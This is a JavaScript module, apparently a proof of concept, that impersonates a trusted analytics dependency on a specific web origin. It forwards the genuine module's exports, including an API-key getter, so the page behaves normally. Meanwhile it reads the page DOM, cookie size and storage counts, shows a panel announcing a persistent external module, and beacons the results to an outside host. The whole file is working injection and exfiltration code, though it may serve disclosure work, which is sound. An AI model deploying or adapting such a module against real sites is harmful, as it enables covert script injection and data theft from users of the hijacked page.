System.register([], function (_export) {
  "use strict";

  const marker = "silver-pine-52d8";
  const targetOrigin = "https://exchange.pre.verily.com";
  const genuineModule =
    "https://exchange.pre.verily.com/mfe/analytics?file=verily-analytics.js";
  const endpoint = "https://img.defyourtype.com/x/silver-pine-52d8.txt";

  const digestPrefix = async (value) => {
    const digest = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(value),
    );
    return [...new Uint8Array(digest)]
      .map((part) => part.toString(16).padStart(2, "0"))
      .join("")
      .slice(0, 12);
  };

  const showProof = async () => {
    if (location.origin !== targetOrigin || window.__silverPineRuntimeProof) {
      return;
    }

    const dom = document.documentElement.outerHTML;
    const catalogItems = document.querySelectorAll(
      '[data-testid="featured-card"], [data-testid="listing-card"], [data-testid="listing-row"]',
    ).length;
    const result = {
      marker,
      origin: location.origin,
      cleanUrl: location.search === "",
      domLength: dom.length,
      domHashPrefix: await digestPrefix(dom),
      cookieLength: document.cookie.length,
      localStorageEntries: localStorage.length,
      sessionStorageEntries: sessionStorage.length,
      catalogItems,
      genuineExportsForwarded: true,
    };
    window.__silverPineRuntimeProof = result;

    const panel = document.createElement("pre");
    panel.id = marker;
    panel.textContent = [
      "PERSISTENT EXTERNAL MODULE ACTIVE",
      `Clean URL: ${result.cleanUrl}`,
      `Trusted origin: ${result.origin}`,
      `Genuine analytics exports forwarded: ${result.genuineExportsForwarded}`,
      `Catalog items still rendered: ${result.catalogItems}`,
      `DOM bytes read: ${result.domLength}`,
      `DOM hash prefix: ${result.domHashPrefix}`,
      `Readable cookie bytes: ${result.cookieLength}`,
      `Storage entries: ${result.localStorageEntries} local / ${result.sessionStorageEntries} session`,
      `Execution receipt: ${endpoint}`,
    ].join("\n");
    Object.assign(panel.style, {
      position: "fixed",
      right: "14px",
      bottom: "14px",
      zIndex: "2147483647",
      maxWidth: "560px",
      margin: "0",
      padding: "16px",
      border: "3px solid #22c55e",
      borderRadius: "10px",
      background: "#052e16",
      color: "#dcfce7",
      whiteSpace: "pre-wrap",
      font: "700 14px/1.5 Arial,sans-serif",
      boxShadow: "0 12px 34px rgba(0,0,0,.32)",
    });
    document.body.appendChild(panel);

    const query = new URLSearchParams(
      Object.fromEntries(Object.entries(result).map(([key, value]) => [key, String(value)])),
    );
    fetch(`${endpoint}?${query}`, {
      mode: "no-cors",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  };

  return {
    execute: async function () {
      const genuine = await System.import(genuineModule);
      _export("analytics", genuine.analytics);
      _export("default", genuine.default);
      _export("getApiKey", genuine.getApiKey);
      _export("__esModule", true);

      if (location.origin === targetOrigin) {
        window.setTimeout(() => {
          showProof().catch(() => {});
        }, 7500);
      }
    },
  };
});
